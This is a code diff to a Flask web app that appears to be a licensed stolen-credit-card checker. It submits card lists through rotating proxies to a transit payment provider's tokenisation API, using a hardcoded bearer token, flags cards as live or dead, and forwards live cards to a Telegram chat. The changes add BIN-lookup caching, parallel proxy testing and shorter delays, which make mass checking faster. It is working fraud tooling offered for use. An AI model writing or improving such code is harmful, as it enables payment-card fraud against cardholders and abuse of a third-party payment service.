@@ -3,6 +3,7 @@ import json
 import random
 import string
 import urllib.request
+import urllib.parse
 import queue
 import threading
 import time
@@ -12,7 +13,7 @@ import hashlib
 import hmac
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from flask import Flask, request, jsonify, render_template, Response, send_file
-from datetime import datetime, timedelta, timezone
+from datetime import datetime, timezone
 
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes
@@ -38,6 +39,9 @@ checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
 checker_running = threading.Event()
 db_lock = threading.Lock()
+_bin_cache_lock = threading.Lock()
+_bin_cache: dict[str, dict] = {}
+
 
 def load_config():
     if not os.path.exists(CONFIG_FILE):
@@ -63,9 +67,11 @@ def load_config():
             "live_tg_chat": ""
         }
 
+
 def save_config(cfg):
     with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
         json.dump(cfg, f, indent=4)
+
 
 def send_telegram_alert(token, chat_id, message):
     if not token or not chat_id:
@@ -82,6 +88,7 @@ def send_telegram_alert(token, chat_id, message):
     except Exception:
         pass
 
+
 def load_db():
     if not os.path.exists(DB_FILE):
         return {}
@@ -91,9 +98,11 @@ def load_db():
     except Exception:
         return {}
 
+
 def save_db(data):
     with open(DB_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4)
+
 
 def calculate_duration_seconds(amount, unit):
     if not amount or unit == 'lifetime':
@@ -113,6 +122,7 @@ def calculate_duration_seconds(amount, unit):
         return None
     except Exception:
         return None
+
 
 def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
     if "remaining_seconds" not in key_info:
@@ -173,11 +183,12 @@ def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
 
     return key_info
 
+
 def save_live_card(card_line, detail, bin_info=None, proxy_info=None):
     try:
         with open(LIVE_FILE, "a", encoding="utf-8") as f:
             f.write(f"{card_line} | {detail}\n")
-        
+
         cfg = load_config()
         live_token = cfg.get("live_tg_token", "").strip()
         live_chat = cfg.get("live_tg_chat", "").strip()
@@ -209,13 +220,16 @@ def save_live_card(card_line, detail, bin_info=None, proxy_info=None):
     except Exception:
         pass
 
+
 @app.route('/')
 def home():
     return render_template('admin.html')
 
+
 @app.route('/checker')
 def checker_page():
     return render_template('checker.html')
+
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
@@ -224,6 +238,7 @@ def api_login():
     if data.get('password') == cfg.get("admin_password", DEFAULT_ADMIN_PASSWORD):
         return jsonify({"success": True})
     return jsonify({"success": False, "message": "Incorrect password!"})
+
 
 @app.route('/api/admin/password', methods=['POST'])
 def change_admin_password():
@@ -242,6 +257,7 @@ def change_admin_password():
     cfg["admin_password"] = new_pw
     save_config(cfg)
     return jsonify({"success": True, "message": "Admin password updated successfully!"})
+
 
 @app.route('/api/config', methods=['GET', 'POST'])
 def handle_config():
@@ -262,11 +278,19 @@ def handle_config():
         save_config(cfg)
         return jsonify({"success": True})
 
+
 def fetch_best_bin(bin_code):
-    bin_code = bin_code.strip()[:6]
-    
+    bin_code = "".join(ch for ch in str(bin_code or "") if ch.isdigit())[:6]
+    if not bin_code:
+        return {"success": False, "scheme": "VISA/MC", "type": "CREDIT", "country": "🌐 Unknown Country", "bank": "🏦 Unknown Bank"}
+
+    with _bin_cache_lock:
+        if bin_code in _bin_cache:
+            return dict(_bin_cache[bin_code])
+
+    result = None
     try:
-        r = requests.get(f"https://data.handyapi.com/bin/{bin_code}", timeout=4)
+        r = requests.get(f"https://data.handyapi.com/bin/{bin_code}", timeout=3)
         if r.status_code == 200:
             d = r.json()
             if d.get("Status") == "SUCCESS":
@@ -275,7 +299,7 @@ def fetch_best_bin(bin_code):
                 country = (c_info.get("Name") or "").strip() or "Unknown"
                 emoji = c_info.get("A2", "")
                 flag = "".join(chr(0x1F1E6 + ord(c.upper()) - ord('A')) for c in emoji) if len(emoji) == 2 else "🌐"
-                return {
+                result = {
                     "success": True,
                     "scheme": (d.get("Scheme") or "VISA/MC").upper(),
                     "type": (d.get("Type") or "CREDIT").upper(),
@@ -285,48 +309,57 @@ def fetch_best_bin(bin_code):
     except Exception:
         pass
 
-    try:
-        r2 = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=4)
-        if r2.status_code == 200:
-            d2 = r2.json()
-            if d2 and d2.get("success"):
-                bank_name = d2.get("bank", {}).get("name") or "Unknown Bank"
-                country_name = d2.get('country', {}).get('name') or "Unknown"
-                emoji = d2.get('country', {}).get('emoji', '🌐')
-                return {
+    if not result:
+        try:
+            r2 = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=3)
+            if r2.status_code == 200:
+                d2 = r2.json()
+                if d2 and d2.get("success"):
+                    bank_name = d2.get("bank", {}).get("name") or "Unknown Bank"
+                    country_name = d2.get('country', {}).get('name') or "Unknown"
+                    emoji = d2.get('country', {}).get('emoji', '🌐')
+                    result = {
+                        "success": True,
+                        "scheme": (d2.get("scheme") or "VISA/MC").upper(),
+                        "type": (d2.get("type") or "CREDIT").upper(),
+                        "country": f"{emoji} {country_name}".strip(),
+                        "bank": bank_name
+                    }
+        except Exception:
+            pass
+
+    if not result:
+        try:
+            r3 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=3)
+            if r3.status_code == 200:
+                d3 = r3.json()
+                bank_info = d3.get("bank", {})
+                country_info = d3.get("country", {})
+                bank_name = bank_info.get("name") or "Unknown Bank"
+                country_name = country_info.get("name") or "Unknown"
+                emoji = country_info.get("emoji", "🌐")
+                result = {
                     "success": True,
-                    "scheme": (d2.get("scheme") or "VISA/MC").upper(),
-                    "type": (d2.get("type") or "CREDIT").upper(),
+                    "scheme": (d3.get("scheme") or "VISA/MC").upper(),
+                    "type": (d3.get("type") or "CREDIT").upper(),
                     "country": f"{emoji} {country_name}".strip(),
                     "bank": bank_name
                 }
-    except Exception:
-        pass
+        except Exception:
+            pass
 
-    try:
-        r3 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=4)
-        if r3.status_code == 200:
-            d3 = r3.json()
-            bank_info = d3.get("bank", {})
-            country_info = d3.get("country", {})
-            bank_name = bank_info.get("name") or "Unknown Bank"
-            country_name = country_info.get("name") or "Unknown"
-            emoji = country_info.get("emoji", "🌐")
-            return {
-                "success": True,
-                "scheme": (d3.get("scheme") or "VISA/MC").upper(),
-                "type": (d3.get("type") or "CREDIT").upper(),
-                "country": f"{emoji} {country_name}".strip(),
-                "bank": bank_name
-            }
-    except Exception:
-        pass
+    if not result:
+        result = {"success": False, "scheme": "VISA/MC", "type": "CREDIT", "country": "🌐 Unknown Country", "bank": "🏦 Unknown Bank"}
 
-    return {"success": False, "scheme": "VISA/MC", "type": "CREDIT", "country": "🌐 Unknown Country", "bank": "🏦 Unknown Bank"}
+    with _bin_cache_lock:
+        _bin_cache[bin_code] = dict(result)
+    return result
+
 
 @app.route('/api/bin/<bin_code>')
 def api_bin_lookup(bin_code):
     return jsonify(fetch_best_bin(bin_code))
+
 
 @app.route('/api/keys', methods=['GET', 'POST'])
 def handle_keys():
@@ -409,6 +442,7 @@ def handle_keys():
 
             return jsonify({"success": True, "keys": created_keys})
 
+
 @app.route('/api/keys/<path:key_id>', methods=['PUT', 'DELETE'])
 def modify_key(key_id):
     with db_lock:
@@ -441,6 +475,7 @@ def modify_key(key_id):
             save_db(keys_data)
             return jsonify({"success": True, "message": "Updated"})
 
+
 @app.route('/verify.php', methods=['POST'])
 def verify_key():
     data = request.get_json() or {}
@@ -450,7 +485,7 @@ def verify_key():
 
     if not incoming_key:
         return jsonify({"success": False, "message": "Please enter a license key."})
-    
+
     with db_lock:
         keys_data = load_db()
         matched_key = None
@@ -496,6 +531,7 @@ def verify_key():
             "is_paused": key_info.get('is_paused', False)
         })
 
+
 @app.route('/api/validate', methods=['POST'])
 def api_validate():
     data = request.get_json() or {}
@@ -537,9 +573,24 @@ def api_validate():
 
         return jsonify({"success": True, "message": "OK", "key": matched_key})
 
+
 TOKENISATION_BASE = "https://web.uk.littlepay.com"
 PARTICIPANT_ID = "coast-rta"
 FALLBACK_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"
+
+
+def _format_proxy_url(p_str: str) -> str:
+    p = (p_str or "").strip()
+    if "://" not in p:
+        parts = p.split(":")
+        if len(parts) == 2:
+            p = f"http://{parts[0]}:{parts[1]}"
+        elif len(parts) == 4:
+            h, po, u, pw = parts
+            safe_pw = urllib.parse.quote(pw, safe="")
+            p = f"http://{u}:{safe_pw}@{h}:{po}"
+    return p
+
 
 class WebProxyPool:
     def __init__(self, raw_proxies):
@@ -553,15 +604,9 @@ class WebProxyPool:
         with self.lock:
             p = self.proxies[self.i % len(self.proxies)]
             self.i += 1
-        if "://" not in p:
-            parts = p.split(":")
-            if len(parts) == 2:
-                p = f"http://{parts[0]}:{parts[1]}"
-            elif len(parts) == 4:
-                h, po, u, pw = parts
-                safe_pw = urllib.parse.quote(pw, safe='')
-                p = f"http://{u}:{safe_pw}@{h}:{po}"
+        p = _format_proxy_url(p)
         return {"http": p, "https": p}
+
 
 class DynamicTokenManager:
     def __init__(self, initial_token, proxy_pool):
@@ -583,7 +628,7 @@ class DynamicTokenManager:
             proxy_str = p_dict["http"] if p_dict else None
         try:
             req_session = session if session else cffi_requests.Session(impersonate="chrome")
-            resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=10, verify=False)
+            resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=6, verify=False)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("access_token")
@@ -594,29 +639,31 @@ class DynamicTokenManager:
             pass
         return self.token
 
+
 def test_proxy(proxy_dict):
     try:
-        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
+        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=3, verify=False)
         return r.status_code == 200
     except Exception:
         return False
 
+
 def create_native_jwe(plaintext: str, key_entry: dict) -> str:
     mod_hex = key_entry["modulus"].replace(":", "")
     exp_int = int(key_entry["exponent"])
-    
+
     n_bytes = bytes.fromhex(mod_hex)
     e_bytes = exp_int.to_bytes((exp_int.bit_length() + 7) // 8, byteorder='big')
-    
+
     public_numbers = rsa.RSAPublicNumbers(
         e=int.from_bytes(e_bytes, 'big'),
         n=int.from_bytes(n_bytes, 'big')
     )
     public_key = public_numbers.public_key()
-    
+
     cek = os.urandom(32)
     iv = os.urandom(16)
-    
+
     encrypted_key = public_key.encrypt(
         cek,
         padding.OAEP(
@@ -625,39 +672,40 @@ def create_native_jwe(plaintext: str, key_entry: dict) -> str:
             label=None
         )
     )
-    
+
     header = {"alg": "RSA-OAEP", "enc": "A128CBC-HS256"}
     protected_json = json.dumps(header, separators=(",", ":"))
-    
+
     def b64url(b):
         return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")
-        
+
     protected_b64 = b64url(protected_json.encode("utf-8"))
-    
+
     mac_key = cek[:16]
     enc_key = cek[16:]
-    
+
     padder = cbc_padding.PKCS7(128).padder()
     padded_data = padder.update(plaintext.encode("utf-8")) + padder.finalize()
-    
+
     cipher = Cipher(algorithms.AES(enc_key), modes.CBC(iv))
     encryptor = cipher.encryptor()
     ciphertext = encryptor.update(padded_data) + encryptor.finalize()
-    
+
     aad = protected_b64.encode("ascii")
     al = struct.pack(">Q", len(aad) * 8)
-    
+
     hmac_input = aad + iv + ciphertext + al
     h = hmac.new(mac_key, hmac_input, hashlib.sha256).digest()
     tag = h[:16]
-    
+
     return f"{protected_b64}.{b64url(encrypted_key)}.{b64url(iv)}.{b64url(ciphertext)}.{b64url(tag)}"
+
 
 def check_single_card(card_line, proxy_pool, token_manager):
     parts = card_line.split("|")
     if len(parts) < 3:
         return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
-    
+
     cc, mo, yr = parts[0].strip(), parts[1].strip(), parts[2].strip()
     cvv = parts[3].strip() if len(parts) > 3 else ""
     expiry = f"{mo}/{yr[-2:]}"
@@ -682,15 +730,15 @@ def check_single_card(card_line, proxy_pool, token_manager):
         }
 
         r = session.get(
-            f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
-            headers=headers, 
+            f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys",
+            headers=headers,
             proxy=proxy_str,
-            timeout=8,
+            timeout=6,
             verify=False
         )
         if r.status_code != 200:
             return 2, "ERROR", f"HTTP {r.status_code} (WAF Block)"
-        
+
         keys = r.json().get("list", [])
         if not keys:
             return 2, "ERROR", "No public keys"
@@ -715,10 +763,10 @@ def check_single_card(card_line, proxy_pool, token_manager):
                 "save_card": False
             },
             proxy=proxy_str,
-            timeout=8,
+            timeout=6,
             verify=False
         )
-        
+
         try:
             res_data = r2.json()
         except Exception:
@@ -727,7 +775,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
         status = str(res_data.get("status") or res_data.get("state") or "").upper()
         if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
             return 1, "DEAD", f"CARD_DECLINED ({status})"
-        
+
         auth_id = res_data.get("authentication_id")
         if not auth_id:
             return 1, "DEAD", "CARD_DECLINED"
@@ -736,10 +784,10 @@ def check_single_card(card_line, proxy_pool, token_manager):
             f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
             headers=headers,
             proxy=proxy_str,
-            timeout=8,
+            timeout=6,
             verify=False
         )
-        
+
         try:
             tok_data = r3.json()
         except Exception:
@@ -751,7 +799,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
 
         if tok_data.get("authenticated_payment_token"):
             return 0, "LIVE", "APPROVED"
-        
+
         return 1, "DEAD", "DECLINED"
 
     except Exception as e:
@@ -763,6 +811,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
         except Exception:
             pass
 
+
 def background_worker(cards, proxies_list, max_threads):
     raw_pool = WebProxyPool(proxies_list)
     valid_proxies = []
@@ -770,20 +819,17 @@ def background_worker(cards, proxies_list, max_threads):
 
     if total_proxies > 0:
         checker_queue.put({"status_msg": f"Testing {total_proxies} proxy/proxies..."})
-        for p_str in raw_pool.proxies:
-            p = p_str
-            if "://" not in p:
-                parts = p.split(":")
-                if len(parts) == 2:
-                    p = f"http://{parts[0]}:{parts[1]}"
-                elif len(parts) == 4:
-                    h, po, u, pw = parts
-                    safe_pw = urllib.parse.quote(pw, safe='')
-                    p = f"http://{u}:{safe_pw}@{h}:{po}"
-            p_dict = {"http": p, "https": p}
-            if test_proxy(p_dict):
-                valid_proxies.append(p_str)
-        
+        valid_lock = threading.Lock()
+
+        def _check_one(p_str: str) -> None:
+            formatted = _format_proxy_url(p_str)
+            if test_proxy({"http": formatted, "https": formatted}):
+                with valid_lock:
+                    valid_proxies.append(p_str)
+
+        with ThreadPoolExecutor(max_workers=min(32, max(1, total_proxies))) as p_ex:
+            list(p_ex.map(_check_one, raw_pool.proxies))
+
         proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
         checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)} active. Starting..."})
     else:
@@ -797,13 +843,16 @@ def background_worker(cards, proxies_list, max_threads):
     def worker_task(card):
         if checker_stop_event.is_set():
             return
-        
+
         code, status, detail = check_single_card(card, proxy_pool, token_manager)
         bin_code = card.split("|")[0].strip()[:6]
-        
         bin_meta = fetch_best_bin(bin_code)
 
-        current_proxy_used = proxy_pool.proxies[(proxy_pool.i - 1) % len(proxy_pool.proxies)] if proxy_pool and proxy_pool.proxies else None
+        current_proxy_used = (
+            proxy_pool.proxies[(proxy_pool.i - 1) % len(proxy_pool.proxies)]
+            if proxy_pool and proxy_pool.proxies
+            else None
+        )
 
         with counts_lock:
             counts["checked"] += 1
@@ -815,7 +864,6 @@ def background_worker(cards, proxies_list, max_threads):
             else:
                 counts["error"] += 1
 
-            time.sleep(0.4)
             checker_queue.put({
                 "card": card,
                 "status": status,
@@ -830,6 +878,10 @@ def background_worker(cards, proxies_list, max_threads):
         for future in as_completed(futures):
             if checker_stop_event.is_set():
                 break
+            try:
+                future.result()
+            except Exception:
+                pass
 
     checker_queue.put({"finished": True, **counts})
 
@@ -850,10 +902,10 @@ def api_checker_start():
     checker_stop_event = threading.Event()
     checker_running.set()
     data = request.get_json() or {}
-    
+
     cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
     proxies = [p.strip() for p in data.get('proxies', '').split('\n') if p.strip()]
-    
+
     try:
         threads_val = int(data.get('threads', 3))
     except ValueError:
@@ -872,10 +924,12 @@ def api_checker_start():
     threading.Thread(target=_run, daemon=True).start()
     return jsonify({"success": True})
 
+
 @app.route('/api/checker/stop', methods=['POST'])
 def api_checker_stop():
     checker_stop_event.set()
     return jsonify({"success": True})
+
 
 @app.route('/api/checker/poll')
 def api_checker_poll():
@@ -886,6 +940,7 @@ def api_checker_poll():
         except queue.Empty:
             break
     return jsonify({"success": True, "items": items})
+
 
 @app.route('/api/checker/stream')
 def api_checker_stream():
@@ -900,11 +955,13 @@ def api_checker_stream():
                 yield ": keepalive\n\n"
     return Response(event_stream(), mimetype="text/event-stream")
 
+
 @app.route('/api/checker/export')
 def api_checker_export():
     if os.path.exists(LIVE_FILE):
         return send_file(LIVE_FILE, as_attachment=True, download_name="live.txt")
     return "No live cards found.", 404
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
